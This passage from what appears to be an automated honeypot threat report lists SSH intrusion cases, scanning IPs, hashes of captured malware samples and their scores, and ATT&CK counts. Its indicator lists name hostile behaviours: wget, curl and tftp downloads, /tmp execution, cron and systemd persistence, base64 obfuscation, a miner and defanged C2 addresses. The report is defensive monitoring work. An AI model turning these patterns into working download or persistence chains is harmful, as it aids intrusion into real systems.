| IR-9eeb0d2cc0e1 | HIGH | `195.178.110[.]227` | 2026-11-08 13:09 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2448a98ff4c1 | HIGH | `195.178.110[.]227` | 2026-11-08 13:11 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9bb47f719f40 | HIGH | `195.178.110[.]227` | 2026-11-08 13:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8e782364684f | HIGH | `195.178.110[.]227` | 2026-11-08 13:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8b0200d1bd80 | HIGH | `195.178.110[.]227` | 2026-11-08 13:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1e1b4e631998 | HIGH | `109.160.32[.]44` | 2026-11-08 13:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-169746529780 | HIGH | `109.160.32[.]44` | 2026-11-08 14:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d2ca18dee26d | HIGH | `42.96.19[.]37` | 2026-11-08 14:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-482679421e24 | HIGH | `42.96.19[.]37` | 2026-11-08 14:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ced65df987a | HIGH | `200.37.103[.]36` | 2026-11-08 14:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-73f349bf5f99 | HIGH | `200.37.103[.]36` | 2026-11-08 14:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0d980f9e013 | HIGH | `109.160.32[.]120` | 2026-11-08 14:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4be7467bf8cf | HIGH | `176.53.159[.]196` | 2026-11-08 14:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7b47fa8e6707 | HIGH | `60.250.246[.]239` | 2026-11-08 14:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-105f4dd52bee | HIGH | `60.250.246[.]239` | 2026-11-08 14:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1bff3396a3ac | HIGH | `152.32.211[.]187` | 2026-11-08 14:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4af8848696bb | HIGH | `152.32.211[.]187` | 2026-11-08 14:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c556d2be3580 | HIGH | `109.160.32[.]44` | 2026-11-08 16:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6853bef9a0e9 | HIGH | `109.160.32[.]120` | 2026-11-08 16:00 | Y | 1 | 0 | `T1078 · T1592` |
_… 3 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]120` | **2** | 2026-11-08 14:24 | 2026-11-08 16:09 | 2m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]167` | **2** | 2026-11-08 11:30 | 2026-11-08 12:13 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]44` | **2** | 2026-11-08 15:48 | 2026-11-08 16:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `77.239.124[.]153` | **2** | 2026-11-08 02:58 | 2026-11-08 04:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.219.208[.]6` | 1 | 2026-11-08 08:04 | 2026-11-08 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.254.214[.]30` | 1 | 2026-11-08 03:54 | 2026-11-08 03:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]110` | 1 | 2026-11-08 09:02 | 2026-11-08 09:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]44` | 1 | 2026-11-08 13:31 | 2026-11-08 13:31 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.87.128[.]233` | 1 | 2026-11-08 11:06 | 2026-11-08 11:06 | 11s | 0 | `T1592` | 🟢 LOW |
| `112.80.141[.]95` | 1 | 2026-11-08 12:06 | 2026-11-08 12:06 | 11s | 0 | `T1592` | 🟢 LOW |
| `113.52.192[.]17` | 1 | 2026-11-08 16:42 | 2026-11-08 16:42 | 15s | 0 | `T1592` | 🟢 LOW |
| `119.199.157[.]77` | 1 | 2026-11-08 05:55 | 2026-11-08 05:56 | 29s | 0 | `T1592` | 🟢 LOW |
| `122.117.53[.]243` | 1 | 2026-11-08 04:37 | 2026-11-08 04:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `123.252.234[.]206` | 1 | 2026-11-08 07:26 | 2026-11-08 07:26 | 32s | 0 | `T1592` | 🟢 LOW |
| `136.49.191[.]72` | 1 | 2026-11-08 10:58 | 2026-11-08 10:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.135.48[.]222` | 1 | 2026-11-08 12:43 | 2026-11-08 12:43 | 33s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-08 15:48 | 2026-11-08 15:49 | 66s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]43` | 1 | 2026-11-08 03:31 | 2026-11-08 03:31 | 3s | 0 | `T1592` | 🟢 LOW |
| `165.245.181[.]145` | 1 | 2026-11-08 08:34 | 2026-11-08 08:34 | 8s | 0 | `T1592` | 🟢 LOW |
| `167.250.28[.]14` | 1 | 2026-11-08 12:52 | 2026-11-08 12:53 | 34s | 0 | `T1592` | 🟢 LOW |
| `167.250.28[.]50` | 1 | 2026-11-08 13:09 | 2026-11-08 13:09 | 34s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-08 11:49 | 2026-11-08 11:49 | 3s | 0 | `T1592` | 🟢 LOW |
| `172.208.64[.]173` | 1 | 2026-11-08 12:10 | 2026-11-08 12:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-11-08 13:55 | 2026-11-08 13:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-11-08 05:37 | 2026-11-08 05:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.208.94[.]235` | 1 | 2026-11-08 10:07 | 2026-11-08 10:07 | 14s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]169` | 1 | 2026-11-08 06:11 | 2026-11-08 06:11 | 2s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | 1 | 2026-11-08 13:08 | 2026-11-08 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-08 06:39 | 2026-11-08 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]5` | 1 | 2026-11-08 11:22 | 2026-11-08 11:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-11-08 13:13 | 2026-11-08 13:13 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.165.159[.]41` | 1 | 2026-11-08 09:16 | 2026-11-08 09:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.12.242[.]206` | 1 | 2026-11-08 07:51 | 2026-11-08 07:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.46.243[.]2` | 1 | 2026-11-08 06:22 | 2026-11-08 06:22 | 9s | 0 | `T1592` | 🟢 LOW |
| `213.174.0[.]201` | 1 | 2026-11-08 04:35 | 2026-11-08 04:35 | 11s | 0 | `T1592` | 🟢 LOW |
| `216.226.78[.]130` | 1 | 2026-11-08 13:41 | 2026-11-08 13:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.170.199[.]52` | 1 | 2026-11-08 13:36 | 2026-11-08 13:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-08 04:49 | 2026-11-08 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-08 11:02 | 2026-11-08 11:02 | 9s | 0 | `T1592` | 🟢 LOW |
| `35.210.108[.]150` | 1 | 2026-11-08 08:06 | 2026-11-08 08:06 | 22s | 0 | `T1592` | 🟢 LOW |
| `35.210.36[.]43` | 1 | 2026-11-08 07:29 | 2026-11-08 07:29 | 29s | 0 | `T1592` | 🟢 LOW |
| `35.210.62[.]153` | 1 | 2026-11-08 03:12 | 2026-11-08 03:12 | 6s | 0 | `T1592` | 🟢 LOW |
| `35.210.70[.]39` | 1 | 2026-11-08 07:41 | 2026-11-08 07:41 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.76[.]225` | 1 | 2026-11-08 03:12 | 2026-11-08 03:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.54.208[.]111` | 1 | 2026-11-08 09:09 | 2026-11-08 09:09 | 14s | 0 | `T1592` | 🟢 LOW |
| `37.54.43[.]58` | 1 | 2026-11-08 15:22 | 2026-11-08 15:23 | 33s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]235` | 1 | 2026-11-08 16:12 | 2026-11-08 16:13 | 60s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-08 09:15 | 2026-11-08 09:15 | 8s | 0 | `T1592` | 🟢 LOW |
| `40.119.27[.]183` | 1 | 2026-11-08 15:33 | 2026-11-08 15:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-08 16:05 | 2026-11-08 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.225.212[.]204` | 1 | 2026-11-08 06:39 | 2026-11-08 06:39 | 33s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-11-08 06:43 | 2026-11-08 06:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-08 12:37 | 2026-11-08 12:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `47.236.165[.]237` | 1 | 2026-11-08 16:40 | 2026-11-08 16:40 | 32s | 0 | `T1592` | 🟢 LOW |
| `50.199.81[.]66` | 1 | 2026-11-08 14:49 | 2026-11-08 14:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-08 04:19 | 2026-11-08 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-08 15:01 | 2026-11-08 15:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.25.9[.]145` | 1 | 2026-11-08 09:09 | 2026-11-08 09:09 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-11-08 06:37 | 2026-11-08 06:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]56` | 1 | 2026-11-08 05:33 | 2026-11-08 05:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-11-08 06:14 | 2026-11-08 06:14 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]100` | 1 | 2026-11-08 08:09 | 2026-11-08 08:09 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]128` | 1 | 2026-11-08 03:04 | 2026-11-08 03:04 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]170` | 1 | 2026-11-08 04:56 | 2026-11-08 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]44` | 1 | 2026-11-08 06:31 | 2026-11-08 06:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.103.237[.]21` | 1 | 2026-11-08 03:29 | 2026-11-08 03:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `75.74.96[.]82` | 1 | 2026-11-08 10:06 | 2026-11-08 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.168.110[.]210` | 1 | 2026-11-08 05:40 | 2026-11-08 05:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-08 11:17 | 2026-11-08 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-08 14:51 | 2026-11-08 14:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]146` | 1 | 2026-11-08 11:00 | 2026-11-08 11:00 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-08 04:10 | 2026-11-08 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.130.117[.]231` | 1 | 2026-11-08 06:35 | 2026-11-08 06:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `8.216.15[.]166` | 1 | 2026-11-08 04:10 | 2026-11-08 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.66.66[.]68` | 1 | 2026-11-08 08:59 | 2026-11-08 08:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.102.194[.]25` | 1 | 2026-11-08 10:57 | 2026-11-08 10:58 | 14s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-11-08 11:48 | 2026-11-08 11:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-11-08 16:51 | 2026-11-08 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.251.64[.]128` | 1 | 2026-11-08 04:37 | 2026-11-08 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.97.175[.]16` | 1 | 2026-11-08 07:20 | 2026-11-08 07:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `109.160.32[.]141` | NL | Global Communication Net Plc | **100** ⚠️ | 30 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `186.96.158[.]180` | MX | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | **100** ⚠️ | 0 |
| `170.231.237[.]214` | CH | GRUPO PANAGLOBAL 15 S.A | **100** ⚠️ | 50 |
| `41.220.30[.]130` | ZW | Telone PVT Ltd | **100** ⚠️ | 8 |
| `8.130.117[.]231` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 5 |
| `46.6.124[.]199` | ES | Xfera Moviles SA / Yoigo | **100** ⚠️ | 10 |
| `109.160.32[.]106` | NL | Global Communication Net Plc | **100** ⚠️ | 44 |
| `109.160.32[.]110` | NL | Global Communication Net Plc | **100** ⚠️ | 40 |
| `192.155.90[.]118` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 150 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 135 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 49 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |

---

## 🔕 False Positive Summary (60 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 18 |
| AbuseIPDB score 1 below threshold 25 | 3 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 7 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 272 cases |
| Tool 34  | Credential Extractor        | ✅ 7793 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
